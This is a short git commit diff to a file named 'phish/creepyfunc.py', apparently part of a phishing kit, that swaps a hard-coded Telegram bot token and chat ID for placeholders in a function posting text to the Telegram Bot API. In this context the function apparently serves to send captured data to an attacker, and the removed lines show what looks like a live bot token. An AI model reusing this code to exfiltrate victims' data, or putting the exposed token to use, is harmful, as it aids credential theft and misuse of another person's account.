9972acd2675a45f4a51f6ef8a994c742f8699321
Siddhant Sharma <79889236+siddhant385@users.noreply.github.com>
2022-05-09 17:08:32 +0530

    Update creepyfunc.py

--- phish/creepyfunc.py
+++ phish/creepyfunc.py
@@ -1,8 +1,8 @@
 import requests
 
 def send_msg(text):
-   token = "2098196046:AAEYk9xSkSiR5VurgpvrXfLcApWKMzoTsjs"
-   chat_id = "1747538159"
+   token = "your-token"
+   chat_id = "your-chat-id"
    url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text 
    results = requests.get(url_req)
    print(results.json())
